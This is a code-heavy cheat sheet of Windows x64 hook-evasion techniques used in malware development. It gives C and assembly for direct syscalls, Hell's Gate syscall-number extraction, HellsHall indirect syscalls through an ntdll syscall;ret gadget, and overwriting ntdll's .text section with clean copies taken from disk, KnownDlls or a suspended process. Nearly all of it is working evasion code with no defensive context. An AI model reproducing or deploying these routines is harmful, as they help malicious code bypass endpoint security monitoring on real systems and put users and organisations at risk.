# Syscalls & Hook Evasion

## Syscall Basics (x64)
```asm
mov r10, rcx
mov eax, <SSN>
syscall
ret
```

## Hell's Gate - Runtime SSN Extraction

### Data Structures
```c
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY;
```

### SSN Extraction Logic
```c
BOOL ExtractSSN(PBYTE pFunc, PWORD pSSN) {
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        *pSSN = *(PWORD)(pFunc + 4);
        return TRUE;
    }
    for (WORD idx = 1; idx <= 500; idx++) {
        PBYTE p = pFunc + (0x20 * idx);
        if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8) {
            *pSSN = *(PWORD)(p + 4) - idx;
            return TRUE;
        }
    }
    for (WORD idx = 1; idx <= 500; idx++) {
        PBYTE p = pFunc - (0x20 * idx);
        if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8) {
            *pSSN = *(PWORD)(p + 4) + idx;
            return TRUE;
        }
    }
    return FALSE;
}
```

### Assembly Stubs (MASM x64)
```asm
.data
    wSystemCall DWORD 000h
.code
    HellsGate PROC
        mov wSystemCall, 000h
        mov wSystemCall, ecx
        ret
    HellsGate ENDP
    HellDescent PROC
        mov r10, rcx
        mov eax, wSystemCall
        syscall
        ret
    HellDescent ENDP
```

## Indirect Syscalls (HellsHall)
```asm
.data
    wSystemCall DWORD 000h
    qSyscallAddr QWORD 0h
.code
    SetSSN PROC
        mov wSystemCall, ecx
        mov qSyscallAddr, rdx
        ret
    SetSSN ENDP
    RunSyscall PROC
        mov r10, rcx
        mov eax, wSystemCall
        jmp qSyscallAddr
    RunSyscall ENDP
```

### Finding syscall;ret Gadget
```c
PVOID FindSyscallGadget(HMODULE hNtdll) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
            PBYTE p = (PBYTE)hNtdll + pSec[i].VirtualAddress;
            for (DWORD j = 0; j < pSec[i].Misc.VirtualSize - 2; j++) {
                if (p[j]==0x0F && p[j+1]==0x05 && p[j+2]==0xC3)
                    return &p[j];
            }
        }
    }
    return NULL;
}
```

## NTDLL Unhooking

### Common Pattern
```c
void ReplaceNtdllTextSection(PVOID pCleanNtdll) {
    PBYTE pLocal = (PBYTE)GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocal;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pLocal + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSec[i].Name, ".text") == 0) {
            PVOID pLocalTxt = pLocal + pSec[i].VirtualAddress;
            DWORD dwSize = pSec[i].Misc.VirtualSize;
            PVOID pCleanTxt = (PBYTE)pCleanNtdll + pSec[i].VirtualAddress;

            DWORD dwOld;
            VirtualProtect(pLocalTxt, dwSize, PAGE_EXECUTE_WRITECOPY, &dwOld);
            memcpy(pLocalTxt, pCleanTxt, dwSize);
            VirtualProtect(pLocalTxt, dwSize, PAGE_EXECUTE_READ, &dwOld);
            break;
        }
    }
}
```

### Source: From Disk
```c
CHAR path[MAX_PATH];
GetWindowsDirectoryA(path, MAX_PATH);
strcat_s(path, "\\System32\\ntdll.dll");
HMODULE hClean = LoadLibraryExA(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
```

### Source: From KnownDlls
```c
HANDLE hSection;
UNICODE_STRING name;
RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);
NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
PVOID pClean = NULL; SIZE_T sz = 0;
NtMapViewOfSection(hSection, NtCurrentProcess(), &pClean, 0, 0, NULL, &sz, ViewUnmap, 0, PAGE_READONLY);
```

### Source: From Suspended Process
```c
CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
ReadProcessMemory(pi.hProcess, pRemoteNtdllText, pBuffer, dwTextSize, NULL);
TerminateProcess(pi.hProcess, 0);
```
